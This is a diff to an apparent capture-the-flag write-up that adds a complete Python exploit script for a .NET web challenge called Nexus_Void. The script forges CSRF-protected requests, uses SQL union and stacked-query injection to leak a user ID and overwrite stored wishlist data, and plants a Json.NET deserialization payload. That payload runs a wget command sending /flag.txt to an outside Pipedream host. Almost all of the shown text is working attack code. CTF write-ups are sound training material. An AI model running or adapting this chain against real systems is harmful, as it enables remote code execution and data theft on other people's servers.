@@ -92,7 +92,102 @@ Now everything is set up. Simply visit the `Home/Wishlist` URL, and the Pipedrea
 
 # Automation
 ```python3
-To be Completed
+import requests, requests.cookies
+import re
+import base64
+
+IP = "94.237.49.182"
+Port = 50165
+
+csrfPattern = re.compile(r'<input name="__RequestVerificationToken" type="hidden" value="([a-zA-Z0-9_\\-]+)" />')
+exfiltrationPattern = re.compile(r'<h3 class="font-semibold text-lg px-3 mt-2 text-white">([0-9]+:hacker)</h3>')
+
+payload = '''{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","output":null,"command":"wget https://eo6ww37wx07qvmv.m.pipedream.net --post-file /flag.txt"}'''
+
+def register():
+    print("Registering the user hacker with password 'hacker'...")
+    r = requests.get(f"http://{IP}:{Port}/Login/Create")
+    csrfToken = csrfPattern.search(r.text)[1]
+    Cookie = r.headers["Set-Cookie"].split(";")[0]
+    headers = {"Cookie": Cookie}
+    data = {
+        "username": "hacker",
+        "password": "hacker",
+        "__RequestVerificationToken": csrfToken,
+    }
+    r = requests.post(f"http://{IP}:{Port}/Login/Create", headers=headers, data=data)
+
+def retrieveSession():
+    # Login so that rest of the operations can be completed with session persistence
+    with requests.Session() as session:    
+        r = session.get(f"http://{IP}:{Port}")
+        csrfToken = csrfPattern.search(r.text)[1]
+        data = {
+            "username": "hacker",
+            "password": "hacker",
+            "__RequestVerificationToken": csrfToken,
+        }
+        print("Logging in as hacker...")
+        r = session.post(f"http://{IP}:{Port}/", data=data, allow_redirects=False)
+        
+        return session
+
+def exfiltrateID(session):
+    print("Adding first item to create the wishlist in database...")
+    # Add the first item so that the wishlist is created in the database
+    data = {
+        "sellerName": "Xclow3n",
+        "name": "Shadowcaster MK VI"
+    }
+    session.post(f"http://{IP}:{Port}/Home/Wishlist", data=data)
+
+    # Union-injection to exfiltrate current user ID 
+    # by including ID as the name of an item in the wishlist
+    print("Exfiltrating current user ID...")
+    data = {
+        "sellerName": "Xclow3n",
+        "name": "' union select 1, (select group_concat(ID_username) from (select (ID||':'||username) as ID_username from Wishlist)), 3, 4, 5, 6, 7--"
+    }
+    session.post(f"http://{IP}:{Port}/Home/Wishlist", data=data)
+
+    # GET request to retrieve exfiltrated ID
+    r = session.get(f"http://{IP}:{Port}/Home/Wishlist")
+    ID = exfiltrationPattern.findall(r.text)[0].split(":")[0]
+
+    return ID
+
+def deliverPayload(session, ID):
+    # Update current user's wishlist.data
+    print("Delivering payload...")
+    base64Payload = base64.b64encode(payload.encode()).decode()
+    SQLi =f'''' union select 1 , '', 3, 4, 5, 6, 7) as "n" LIMIT 1; UPDATE Wishlist SET data='{base64Payload}' WHERE ID='{ID}';--'''
+    data = {
+        "sellerName": "Xclow3n",
+        "name": SQLi
+    }
+    session.post(f"http://{IP}:{Port}/Home/Wishlist", data=data)
+
+def triggerPayload(session):
+    # Trigger deserilization of the payload 
+    # by retrieving current user's wishlist
+    print("Triggering payload...")
+    session.get(f"http://{IP}:{Port}/Home/Wishlist")
+  
+def exploit(session):
+    ID = exfiltrateID(session)
+    deliverPayload(session, ID)
+    triggerPayload(session)
+    print("Done! Check Your HTTP Request Bin")
+    
+def main():
+    # Register a new user
+    register()
+    # Login and retrieve session token so that we can interact with more backend APIs
+    session = retrieveSession()
+    exploit(session)
+    
+if __name__ == "__main__":
+    main()
 ```
 
 # Beyond Flag
